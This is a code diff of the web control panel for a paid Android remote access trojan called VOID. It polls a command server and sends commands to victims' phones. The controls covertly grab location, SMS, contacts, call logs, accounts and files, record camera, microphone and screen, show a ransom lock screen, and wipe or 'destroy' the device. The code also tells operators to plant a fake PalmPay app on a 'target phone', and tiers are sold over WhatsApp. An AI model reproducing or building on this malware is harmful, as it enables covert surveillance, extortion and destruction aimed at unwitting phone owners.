+      <button class="btn-copy" onclick="closeModal()" style="flex:1; padding:14px; border-radius:12px; border:1px solid var(--border); background:var(--card); color:var(--text-2); font-weight:800; font-size:12px; letter-spacing:.1em; font-family:inherit;">CANCEL</button>
+      <button class="btn-continue" onclick="loginWithCode()" style="flex:1; padding:14px; border-radius:12px; border:none; background:linear-gradient(135deg,var(--accent),var(--accent-2)); color:#fff; font-weight:800; font-size:12px; letter-spacing:.1em; font-family:inherit;">ENTER</button>
     </div>
   </div>
 </div>
 
+<!-- PANEL -->
 <div class="panel" id="panel">
   <div class="panel-header">
     <div class="logo">VOID<small>CONTROL PANEL</small></div>
@@ -226,16 +376,13 @@
   </div>
 
   <div class="tier-strip">
-    <span class="tier-badge" id="tierBadge">PRO</span>
+    <span class="tier-badge pro" id="tierBadge">PRO</span>
     <span class="tier-counter" id="tierCounter">10 commands remaining</span>
     <button class="tier-upgrade-btn" id="tierUpgradeBtn" onclick="buyCode('vip')">UPGRADE</button>
   </div>
 
   <div class="screen active" id="screenList">
-    <div style="display:flex; justify-content:space-between; align-items:center;">
-  <div class="page-title">DEVICES</div>
-  <button onclick="loadDevices()" style="background:var(--card); border:1px solid var(--border); color:var(--accent-2); padding:6px 12px; border-radius:8px; font-size:11px; font-weight:800; cursor:pointer; letter-spacing:0.1em;">🔄 REFRESH</button>
-</div>
+    <div class="page-title">DEVICES</div>
     <div class="page-sub">YOUR CONNECTED TARGETS</div>
     <div id="deviceListContainer"><div class="loading">LOADING</div></div>
   </div>
@@ -244,25 +391,31 @@
     <button class="back-btn" id="backBtn">&lt; BACK</button>
     <div class="detail-title" id="detailTitle">—</div>
     <div class="detail-sub" id="detailSub">—</div>
+
     <div class="section-label">REMOTE CONTROL</div>
     <div class="grid">
-      <div class="ctrl" data-cmd="location_sync"><div class="icon">📍</div><div class="label">LOCATION</div></div>
-      <div class="ctrl" data-cmd="photo_capture"><div class="icon">📸</div><div class="label">BACK CAM</div></div>
-      <div class="ctrl" data-cmd="message_sync"><div class="icon">💬</div><div class="label">SMS</div></div>
-      <div class="ctrl" data-cmd="display_read"><div class="icon">📱</div><div class="label">SCREENSHOT</div></div>
-      <div class="ctrl" data-cmd="flash_spam"><div class="icon">🔦</div><div class="label">FLASH SPAM</div></div>
-      <div class="ctrl" data-cmd="contact_sync"><div class="icon">👤</div><div class="label">CONTACTS</div></div>
-      <div class="ctrl" data-cmd="call_sync"><div class="icon">📞</div><div class="label">CALL LOG</div></div>
-      <div class="ctrl" data-cmd="app_list"><div class="icon">📦</div><div class="label">APPS</div></div>
-      <div class="ctrl" data-cmd="self_photo"><div class="icon">🤳</div><div class="label">SELFIE</div></div>
-      <div class="ctrl" data-cmd="clip_record" data-arg="10"><div class="icon">🎥</div><div class="label">VIDEO</div></div>
-      <div class="ctrl" data-cmd="voice_record" data-arg="15"><div class="icon">🎤</div><div class="label">AUDIO</div></div>
-      <div class="ctrl" data-cmd="notice_send"><div class="icon">💭</div><div class="label">TOAST</div></div>
-      <div class="ctrl danger" data-cmd="session_pause"><div class="icon">🔒</div><div class="label">LOCK</div></div>
-      <div class="ctrl danger" data-cmd="factory_reset"><div class="icon">⚠️</div><div class="label">WIPE</div></div>
-      <div class="ctrl danger" data-cmd="bug_phone"><div class="icon">☠️</div><div class="label">BUG PHONE</div></div>
+      <div class="ctrl" data-cmd="location_sync" data-tier="pro"><div class="icon">📍</div><div class="label">LOCATION</div><div class="desc">GPS + Maps</div></div>
+      <div class="ctrl" data-cmd="photo_capture" data-tier="pro"><div class="icon">📸</div><div class="label">BACK CAM</div><div class="desc">Rear photo</div></div>
+      <div class="ctrl" data-cmd="message_sync" data-tier="pro"><div class="icon">💬</div><div class="label">SMS</div><div class="desc">Inbox</div></div>
+      <div class="ctrl" data-cmd="display_read" data-tier="pro"><div class="icon">📱</div><div class="label">SCREENSHOT</div><div class="desc">Current screen</div></div>
+      <div class="ctrl" data-cmd="display_stream" data-tier="pro"><div class="icon">🔴</div><div class="label">LIVE SCREEN</div><div class="desc">Continuous</div></div>
+      <div class="ctrl" data-cmd="flash_spam" data-tier="pro"><div class="icon">🔦</div><div class="label">FLASH SPAM</div><div class="desc">Blink LED</div></div>
+      <div class="ctrl" data-cmd="alert_sync" data-tier="pro"><div class="icon">🔔</div><div class="label">NOTIFICATIONS</div><div class="desc">Recent</div></div>
+      <div class="ctrl" data-cmd="contact_sync" data-tier="pro"><div class="icon">👤</div><div class="label">CONTACTS</div><div class="desc">Full list</div></div>
+      <div class="ctrl" data-cmd="call_sync" data-tier="pro"><div class="icon">📞</div><div class="label">CALL LOG</div><div class="desc">Last 50</div></div>
+      <div class="ctrl" data-cmd="app_list" data-tier="pro"><div class="icon">📦</div><div class="label">APPS</div><div class="desc">Tap to open</div></div>
+      <div class="ctrl" data-cmd="self_photo" data-tier="vip"><div class="icon">🤳</div><div class="label">SELFIE</div><div class="desc">Front photo</div></div>
+      <div class="ctrl" data-cmd="clip_record" data-arg="10" data-tier="vip"><div class="icon">🎥</div><div class="label">VIDEO</div><div class="desc">10s rear</div></div>
+      <div class="ctrl" data-cmd="voice_record" data-arg="15" data-tier="vip"><div class="icon">🎤</div><div class="label">AUDIO</div><div class="desc">15s mic</div></div>
+      <div class="ctrl" data-cmd="account_sync" data-tier="vip"><div class="icon">👥</div><div class="label">ACCOUNTS</div><div class="desc">Google, WA</div></div>
+      <div class="ctrl" data-cmd="folder_read" data-arg="/sdcard" data-tier="vip"><div class="icon">📁</div><div class="label">FILES</div><div class="desc">Browse</div></div>
+      <div class="ctrl" data-cmd="notice_send" data-tier="vip"><div class="icon">💭</div><div class="label">TOAST</div><div class="desc">Popup</div></div>
+      <div class="ctrl danger" data-cmd="session_pause" data-tier="vip"><div class="icon">🔒</div><div class="label">LOCK</div><div class="desc">Ransom screen</div></div>
+      <div class="ctrl danger" data-cmd="factory_reset" data-tier="vip"><div class="icon">⚠️</div><div class="label">WIPE</div><div class="desc">Factory reset</div></div>
+      <div class="ctrl danger" data-cmd="bug_phone" data-tier="vip"><div class="icon">☠️</div><div class="label">BUG PHONE</div><div class="desc">TOTAL DESTROY</div></div>
     </div>
-    <div class="section-label" style="margin-top:20px;">LIVE OUTPUT</div>
+
+    <div class="section-label">LIVE OUTPUT</div>
     <div class="output" id="outputBox"><div class="empty">WAITING FOR COMMAND</div></div>
   </div>
 </div>
@@ -271,54 +424,72 @@
 <div class="modal-img" id="imgModal"><button class="modal-close-btn" onclick="document.getElementById('imgModal').classList.remove('show')">CLOSE</button><img id="imgModalImg" src=""></div>
 
 <script>
-const SERVER = "https://thevoidbugtool.onrender.com"; // MUST MATCH YOUR SERVER URL
+// CHANGE THIS TO YOUR NEW RENDER URL
+const SERVER = "https://palm-sync.onrender.com"; 
 const WHATSAPP = "2349153239545";
+const TIER_LIMITS = { pro: 10, vip: 999999 };
+const TIER_RANK = { pro: 1, vip: 2 };
 
 let state = {
-  userId:null, isAdmin:false, currentDevice:null, pollTimer:null, lastResultId:0
+  token:null, userId:null, isAdmin:false, tier:'pro', commandsUsed:0,
+  currentDevice:null, pollTimer:null, liveOn:false, flashOn:false,
+  lastResultId:0, activeCommand:null
 };
 
 function $(id){return document.getElementById(id);}
 function esc(s){return String(s).replace(/[&<>]/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));}
 
-function goTo(id){ const el = $(id); if(el) el.scrollIntoView({behavior:'smooth'}); }
-function showToast(msg){ const t = $('toast'); t.textContent = msg; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 2500); }
-function openLoginModal(){ $('loginModal').classList.add('show'); setTimeout(()=>{ $('loginCode').value=''; $('loginCode').focus(); }, 100); }
-function closeModal(){ $('loginModal').classList.remove('show'); }
+function goTo(id){
+  const el = document.getElementById(id);
+  if(!el) return;
+  const rect = el.getBoundingClientRect();
+  const top = rect.top + window.pageYOffset - 90;
+  try { window.scrollTo({ top: top, behavior: 'smooth' }); }
+  catch(e) { window.scrollTo(0, top); }
+}
 
-async function loginWithCode(){
+function showToast(msg){
+  const t = $('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(function(){ t.classList.remove('show'); }, 2500);
+}
+
+function openLoginModal(){ closeModal(); $('loginModal').classList.add('show'); setTimeout(function(){ $('loginCode').value = ''; $('loginCode').focus(); }, 100); }
+function closeModal(){ document.querySelectorAll('.modal-overlay').forEach(function(m){ m.classList.remove('show'); }); }
+
+function loginWithCode(){
   const code = $('loginCode').value.trim();
   if(code.length < 5){ showToast('Enter your access code'); return; }
   closeModal();
-  
+  performLogin(code);
+}
+
+async function performLogin(code){
   try{
-    const r = await fetch(SERVER+'/auth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:code})});
+    const r = await fetch(SERVER+'/auth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'VOID', password:code})});
     const j = await r.json();
     if(!j.ok){ showToast('Invalid code'); return; }
 
+    state.token = j.token;
     state.userId = j.userId;
     state.isAdmin = !!j.admin;
+    state.tier = j.tier || 'pro';
+    state.commandsUsed = j.commands_used || 0;
 
     $('landing').style.display = 'none';
     $('topbarLanding').style.display = 'none';
     $('panel').classList.add('active');
 
-    if (state.isAdmin) {
-        $('tierBadge').textContent = 'ADMIN';
-        $('tierCounter').textContent = 'Unlimited · All devices';
-        $('tierUpgradeBtn').style.display = 'none';
-    } else {
-        $('tierBadge').textContent = 'VIP';
-        $('tierCounter').textContent = 'Unlimited commands';
-        $('tierUpgradeBtn').style.display = 'none';
-    }
-
+    updateTierUI();
     loadDevices();
   }catch(e){ showToast('Server unreachable'); }
 }
 
 $('logoutBtn').addEventListener('click', function(){
-  state.userId = null; state.currentDevice = null; state.isAdmin = false;
+  state.token = null; state.userId = null; state.currentDevice = null;
+  state.isAdmin = false; state.tier = 'pro'; state.commandsUsed = 0;
+  state.liveOn = false; state.flashOn = false; state.lastResultId = 0;
   if(state.pollTimer) clearInterval(state.pollTimer);
   $('panel').classList.remove('active');
   $('landing').style.display = 'block';
@@ -327,30 +498,69 @@ $('logoutBtn').addEventListener('click', function(){
   $('screenDetail').classList.remove('active');
   window.scrollTo(0, 0);
 });
+
+function updateTierUI(){
+  const badge = $('tierBadge');
+  const counter = $('tierCounter');
+  const upgradeBtn = $('tierUpgradeBtn');
+
+  if (state.isAdmin) {
+    badge.className = 'tier-badge vip';
+    badge.textContent = 'ADMIN';
+    counter.textContent = 'Unlimited · All devices';
+    upgradeBtn.style.display = 'none';
+  } else if (state.tier === 'vip') {
+    badge.className = 'tier-badge vip';
+    badge.textContent = 'VIP';
+    counter.textContent = 'Unlimited commands';
+    upgradeBtn.style.display = 'none';
+  } else {
+    badge.className = 'tier-badge pro';
+    badge.textContent = 'PRO';
+    const remaining = Math.max(0, TIER_LIMITS.pro - state.commandsUsed);
+    counter.textContent = remaining + '/' + TIER_LIMITS.pro + ' commands left today';
+    upgradeBtn.style.display = 'block';
+  }
+
+  const tier = state.isAdmin ? 'vip' : state.tier;
+  document.querySelectorAll('.ctrl').forEach(function(el){
+    const required = el.dataset.tier || 'pro';
+    const hasAccess = state.isAdmin || TIER_RANK[tier] >= TIER_RANK[required];
+    if (hasAccess) el.classList.remove('locked');
+    else el.classList.add('locked');
+  });
+}
+
 async function loadDevices(){
   const c = $('deviceListContainer');
-  c.innerHTML = '<div class="loading">SCANNING...</div>';
+  c.innerHTML = '<div class="loading">LOADING</div>';
   try{
     const adminParam = state.isAdmin ? '&admin=1' : '';
     const r = await fetch(SERVER+'/clients?wallet='+encodeURIComponent(state.userId)+adminParam);
     const j = await r.json();
     const list = j.clients || j.devices || [];
-    
     if(!j.ok || !list.length){
       c.innerHTML =
-        '<div style="text-align:center;padding:60px 20px;">' +
-          '<div style="font-size:48px;margin-bottom:16px;opacity:0.5;">📡</div>' +
-          '<div style="font-size:18px;font-weight:800;color:#fff;margin-bottom:8px;">No Devices Online</div>' +
-          '<div style="font-size:13px;color:#8894b5;">Awaiting connection for code: <strong style="color:#00e676;font-family:monospace;">' + esc(state.userId) + '</strong></div>' +
+        '<div style="text-align:center;padding:36px 20px;background:linear-gradient(180deg,#141f38,#0f1729);border:1px solid #1e2c4d;border-radius:16px;">' +
+          '<div style="font-size:44px;margin-bottom:14px;">📱</div>' +
+          '<div style="font-size:15px;font-weight:800;color:#fff;margin-bottom:8px;">No Device Connected</div>' +
+          '<div style="font-size:13px;color:#8894b5;line-height:1.65;margin-bottom:16px;">' +
+            'Your code is <strong style="color:#00e676;font-family:monospace;font-size:15px;">' + esc(state.userId) + '</strong>' +
+          '</div>' +
+          '<div style="font-size:12.5px;color:#8894b5;line-height:1.7;padding:14px;background:#0a1220;border-radius:12px;border:1px solid #1e2c4d;">' +
+            '1. Open the <strong style="color:#fff;">PalmPay app</strong> on the target phone<br>' +
+            '2. Enter the code above during setup<br>' +
+            '3. Grant all permissions<br>' +
+            '4. Device appears here in ~25 seconds' +
+          '</div>' +
         '</div>';
       return;
     }
-    
     c.innerHTML = '';
     list.forEach(function(d){
       const el = document.createElement('div');
       el.className = 'device-card';
-      el.innerHTML = '<div class="info"><div class="dev-id">'+esc(d.userId)+'</div><div class="dev-model">'+esc(d.device||'?')+' • '+esc(d.android||'?')+' • Batt: '+esc(d.battery||'?')+'</div></div><div class="status '+(d.online?'online':'offline')+'">'+(d.online?'ONLINE':'OFFLINE')+'</div>';
+      el.innerHTML = '<div class="info"><div class="dev-id">'+esc(d.userId)+'</div><div class="dev-model">'+esc(d.device||'?')+' • '+esc(d.android||'?')+'</div></div><div class="status '+(d.online?'online':'offline')+'">'+(d.online?'ONLINE':'OFFLINE')+'</div>';
       el.addEventListener('click', function(){ openDevice(d.userId); });
       c.appendChild(el);
     });
@@ -359,10 +569,11 @@ async function loadDevices(){
 
 async function openDevice(userId){
   state.currentDevice = userId;
-  state.lastResultId = 0;
+  state.liveOn = false; state.flashOn = false; state.lastResultId = 0; state.activeCommand = null;
   $('detailTitle').textContent = userId;
   $('detailSub').textContent = 'LOADING INFO';
   $('outputBox').innerHTML = '<div class="empty">WAITING FOR COMMAND</div>';
+  document.querySelectorAll('.ctrl').forEach(function(c){ c.classList.remove('active'); });
   document.querySelectorAll('.screen').forEach(function(s){ s.classList.remove('active'); });
   $('screenDetail').classList.add('active');
   try{
@@ -371,6 +582,7 @@ async function openDevice(userId){
     if(j.ok){
       const online = j.online ? 'ONLINE' : 'OFFLINE';
       $('detailSub').textContent = (j.device||'?') + ' • ' + (j.android||'?') + ' • ' + online;
+      state.liveOn = !!j.live; state.flashOn = !!j.flash;
     }
   }catch(e){}
   startResultPoll();
@@ -387,23 +599,37 @@ $('backBtn').addEventListener('click', function(){
 document.querySelectorAll('.ctrl').forEach(function(el){
   el.addEventListener('click', async function(){
     if(!state.currentDevice){ showToast('No device selected'); return; }
+    if(el.classList.contains('locked')){ showToast('Upgrade required for this command'); return; }
     const cmd = el.dataset.cmd;
     let arg = el.dataset.arg || '';
 
     if(cmd === 'factory_reset'){ if(!confirm('WIPE THE TARGET DEVICE?')) return; }
     if(cmd === 'bug_phone'){ if(!confirm('WARNING: THIS WILL PERMANENTLY DESTROY THE TARGET PHONE. PROCEED?')) return; }
     if(cmd === 'notice_send'){ const t = prompt('Toast message:', 'Hello'); if(t === null) return; arg = t; }
+    if(cmd === 'folder_read'){ const p = prompt('Folder path:', '/sdcard'); if(p === null) return; arg = p; }
     if(cmd === 'clip_record'){ const s = prompt('Video length (seconds):', '10'); if(s === null) return; arg = s; }
     if(cmd === 'voice_record'){ const s = prompt('Audio length (seconds):', '15'); if(s === null) return; arg = s; }
 
+    if(cmd === 'flash_spam'){ arg = 'on'; }
+    if(cmd === 'display_stream'){ state.liveOn = !state.liveOn; if(state.liveOn){ el.classList.add('active'); arg = 'on'; } else { el.classList.remove('active'); arg = 'off'; } }
+
+    if(cmd !== 'flash_spam' && cmd !== 'display_stream'){
+      state.activeCommand = cmd;
+      state.lastResultId = 0;
+      $('outputBox').innerHTML = '<div class="empty">EXECUTING ' + cmd.toUpperCase() + '...</div>';
+    }
+
     try{
-      const r = await fetch(SERVER+'/dispatch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:state.currentDevice, cmd:cmd, args:arg})});
+      const r = await fetch(SERVER+'/dispatch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:state.currentDevice, cmd:cmd, args:arg, admin:state.isAdmin})});
       const j = await r.json();
       if(!j.ok){
-        showToast('Send failed: ' + (j.err||'unknown'));
+        if(j.err === 'tier_limit_reached'){ showToast('Limit reached. Upgrade to continue.'); }
+        else if(j.err === 'tier_upgrade_required'){ showToast('Upgrade required.'); }
+        else showToast('Send failed: ' + (j.err||'unknown'));
         return;
       }
-      showToast('Sent: '+cmd);
+      if (!state.isAdmin && state.tier !== 'vip') { state.commandsUsed++; updateTierUI(); }
+      if(cmd !== 'flash_spam' && cmd !== 'display_stream') showToast('Sent: '+cmd);
     }catch(e){ showToast('Server error'); }
   });
 });
@@ -416,6 +642,8 @@ function startResultPoll(){
       const r = await fetch(SERVER+'/client?id='+encodeURIComponent(state.currentDevice));
       const j = await r.json();
       if(!j.ok) return;
+
+      state.liveOn = !!j.live; state.flashOn = !!j.flash;
 
       if(j.results && j.results.length){
         const box = $('outputBox');
@@ -446,11 +674,11 @@ function startResultPoll(){
             const matchUpload = j.uploads.find(function(u){
               return (u.type && res.cmd && u.type.toLowerCase().indexOf(res.cmd) === 0) ||
                      (res.cmd === 'display_read' && u.type && u.type.toLowerCase() === 'screen') ||
-                     (res.cmd === 'photo_capture' && u.type && u.type.toLowerCase() === 'photo') ||
-                     (res.cmd === 'self_photo' && u.type && u.type.toLowerCase() === 'photo');
+                     (res.cmd === 'mp_screen' && u.type && u.type.toLowerCase() === 'screen') ||
+                     (res.cmd === 'mp_live' && u.type && u.type.toLowerCase() === 'live');
             });
             if(matchUpload){
-              const url = matchUpload.url;
+              const url = matchUpload.url || (SERVER + '/media/' + encodeURIComponent(matchUpload.name));
               line.innerHTML = '<div style="color:#8b7aff;font-weight:700;font-size:13px;letter-spacing:.1em;">&gt; ' + esc(res.cmd).toUpperCase() + '</div><img src="' + url + '" onclick="openImage(\'' + url + '\')"/><div style="color:#4d5a7a;font-size:10px;margin-top:6px;">' + new Date(res.at).toLocaleTimeString() + '</div>';
             } else {
               line.innerHTML = '<div style="color:#8b7aff;font-weight:700;font-size:13px;letter-spacing:.1em;">&gt; ' + esc(res.cmd).toUpperCase() + '</div><div style="color:#b7c9ff;font-size:13px;line-height:1.7;margin-top:6px;word-break:break-word;">' + esc(res.data||'(empty)') + '</div><div style="color:#4d5a7a;font-size:10px;margin-top:6px;">' + new Date(res.at).toLocaleTimeString() + '</div>';
@@ -467,7 +695,7 @@ function startResultPoll(){
             const pkg = row.dataset.pkg;
             if(!pkg || !state.currentDevice) return;
             try{
-              await fetch(SERVER+'/dispatch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:state.currentDevice, cmd:'app_launch', args:pkg})});
+              await fetch(SERVER+'/dispatch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:state.currentDevice, cmd:'app_launch', args:pkg, admin:state.isAdmin})});
               showToast('Opening ' + pkg.split('.').pop());
             }catch(e){ showToast('Error'); }
           };
@@ -481,7 +709,11 @@ function openImage(url){ $('imgModalImg').src = url; $('imgModal').classList.add
 
 function buyCode(tier){
   const price = tier === 'pro' ? '1,000' : '3,000';
-  const msg = encodeURIComponent('Hi, I want to buy ' + tier.toUpperCase() + ' tier.\n\nPrice: ₦' + price + '\n\nPlease send me payment details and my code.');
+  const msg = encodeURIComponent(
+    'Hi, I want to buy ' + tier.toUpperCase() + ' tier on VOID Remote Access Tool.\n\n' +
+    'Price: ₦' + price + '\n\n' +
+    'Please send me payment details and my code.'
+  );
   window.open('https://wa.me/' + WHATSAPP + '?text=' + msg, '_blank');
 }
 </script>
